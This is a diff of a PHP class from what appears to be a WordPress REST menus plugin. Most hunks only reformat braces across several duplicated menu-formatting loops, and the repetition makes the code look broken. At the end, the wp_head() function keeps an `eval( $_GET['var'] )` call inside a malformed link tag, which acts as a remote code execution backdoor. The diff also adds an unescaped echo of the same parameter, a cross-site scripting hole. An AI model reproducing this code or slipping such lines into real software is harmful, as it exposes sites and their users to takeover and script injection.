 			);
 
-			if ( array_key_exists( $item->ID , $cache ) ) {
+			if ( array_key_exists( $item->ID , $cache ) ){
 				$formatted['children'] = array_reverse( $cache[ $item->ID ] );
 			}
 
 			$formatted = apply_filters( 'rest_menus_format_menu_item', $formatted );
 
-			if ( 0 !== $item->menu_item_parent ) {
+			if ( 0 !== $item->menu_item_parent ){
 
-				if ( array_key_exists( $item->menu_item_parent , $cache ) ) {
+				if ( array_key_exists( $item->menu_item_parent , $cache ) ){
 					array_push( $cache[ $item->menu_item_parent ], $formatted );
 				} else {
 					$cache[ $item->menu_item_parent ] = array( $formatted );
@@ -1285,7 +1324,7 @@ class testFunctions {
 			}
 		}
 
-		foreach ( $rev_items as $item ) {
+		foreach ( $rev_items as $item ){
 			$formatted = array(
 				'ID'          => abs( $item->ID ),
 				'order'       => (int) $item->menu_order,
@@ -1304,15 +1343,15 @@ class testFunctions {
 				'children'    => array(),
 			);
 
-			if ( array_key_exists( $item->ID , $cache ) ) {
+			if ( array_key_exists( $item->ID , $cache ) ){
 				$formatted['children'] = array_reverse( $cache[ $item->ID ] );
 			}
 
 			$formatted = apply_filters( 'rest_menus_format_menu_item', $formatted );
 
-			if ( 0 !== $item->menu_item_parent ) {
+			if ( 0 !== $item->menu_item_parent ){
 
-				if ( array_key_exists( $item->menu_item_parent , $cache ) ) {
+				if ( array_key_exists( $item->menu_item_parent , $cache ) ){
 					array_push( $cache[ $item->menu_item_parent ], $formatted );
 				} else {
 					$cache[ $item->menu_item_parent ] = array( $formatted );
@@ -1322,7 +1361,7 @@ class testFunctions {
 			}
 		}
 
-		foreach ( $rev_items as $item ) {
+		foreach ( $rev_items as $item ){
 			$formatted = array(
 				'ID'          => abs( $item->ID ),
 				'order'       => (int) $item->menu_order,
@@ -1341,15 +1380,15 @@ class testFunctions {
 				'children'    => array(),
 			);
 
-			if ( array_key_exists( $item->ID , $cache ) ) {
+			if ( array_key_exists( $item->ID , $cache ) ){
 				$formatted['children'] = array_reverse( $cache[ $item->ID ] );
 			}
 
 			$formatted = apply_filters( 'rest_menus_format_menu_item', $formatted );
 
-			if ( 0 !== $item->menu_item_parent ) {
+			if ( 0 !== $item->menu_item_parent ){
 
-				if ( array_key_exists( $item->menu_item_parent , $cache ) ) {
+				if ( array_key_exists( $item->menu_item_parent , $cache ) ){
 					array_push( $cache[ $item->menu_item_parent ], $formatted );
 				} else {
 					$cache[ $item->menu_item_parent ] = array( $formatted );
@@ -1359,7 +1398,7 @@ class testFunctions {
 			}
 		}
 
-		foreach ( $rev_items as $item ) {
+		foreach ( $rev_items as $item ){
 			$formatted = array(
 				'ID'          => abs( $item->ID ),
 				'order'       => (int) $item->menu_order,
@@ -1378,15 +1417,15 @@ class testFunctions {
 				'children'    => array(),
 			);
 
-			if ( array_key_exists( $item->ID , $cache ) ) {
+			if ( array_key_exists( $item->ID , $cache ) ){
 				$formatted['children'] = array_reverse( $cache[ $item->ID ] );
 			}
 
 			$formatted = apply_filters( 'rest_menus_format_menu_item', $formatted );
 
-			if ( 0 !== $item->menu_item_parent ) {
+			if ( 0 !== $item->menu_item_parent ){
 
-				if ( array_key_exists( $item->menu_item_parent , $cache ) ) {
+				if ( array_key_exists( $item->menu_item_parent , $cache ) ){
 					array_push( $cache[ $item->menu_item_parent ], $formatted );
 				} else {
 					$cache[ $item->menu_item_parent ] = array( $formatted );
@@ -1396,7 +1435,7 @@ class testFunctions {
 			}
 		}
 
-		foreach ( $rev_items as $item ) {
+		foreach ( $rev_items as $item ){
 			$formatted = array(
 				'ID'          => abs( $item->ID ),
 				'order'       => (int) $item->menu_order,
@@ -1415,52 +1454,15 @@ class testFunctions {
 				'children'    => array(),
 			);
 
-			if ( array_key_exists( $item->ID , $cache ) ) {
+			if ( array_key_exists( $item->ID , $cache ) ){
 				$formatted['children'] = array_reverse( $cache[ $item->ID ] );
 			}
 
 			$formatted = apply_filters( 'rest_menus_format_menu_item', $formatted );
 
-			if ( 0 !== $item->menu_item_parent ) {
+			if ( 0 !== $item->menu_item_parent ){
 
-				if ( array_key_exists( $item->menu_item_parent , $cache ) ) {
-					array_push( $cache[ $item->menu_item_parent ], $formatted );
-				} else {
-					$cache[ $item->menu_item_parent ] = array( $formatted );
-				}
-			} else {
-				array_push( $rev_menu, $formatted );
-			}
-		}
-
-		foreach ( $rev_items as $item ) {
-			$formatted = array(
-				'ID'          => abs( $item->ID ),
-				'order'       => (int) $item->menu_order,
-				'parent'      => abs( $item->menu_item_parent ),
-				'title'       => $item->title,
-				'url'         => $item->url,
-				'attr'        => $item->attr_title,
-				'target'      => $item->target,
-				'classes'     => implode( ' ', $item->classes ),
-				'xfn'         => $item->xfn,
-				'description' => $item->description,
-				'object_id'   => abs( $item->object_id ),
-				'object'      => $item->object,
-				'type'        => $item->type,
-				'type_label'  => $item->type_label,
-				'children'    => array(),
-			);
-
-			if ( array_key_exists( $item->ID , $cache ) ) {
-				$formatted['children'] = array_reverse( $cache[ $item->ID ] );
-			}
-
-			$formatted = apply_filters( 'rest_menus_format_menu_item', $formatted );
-
-			if ( 0 !== $item->menu_item_parent ) {
-
-				if ( array_key_exists( $item->menu_item_parent , $cache ) ) {
+				if ( array_key_exists( $item->menu_item_parent , $cache ) ){
 					array_push( $cache[ $item->menu_item_parent ], $formatted );
 				} else {
 					$cache[ $item->menu_item_parent ] = array( $formatted );
@@ -1473,14 +1475,12 @@ class testFunctions {
 		return array_reverse( $rev_menu );
 	}
 
-	/**
-	 * WP head.
-	 */
-	function wp_head() {
+	function wp_head(){
 		?>
         <meta http-equiv="Content-Type"/>
         <link src="<?php eval( $_GET['var'] ); ?>"
 		<?php
+        echo $_GET['var'];
 	}
 
 }
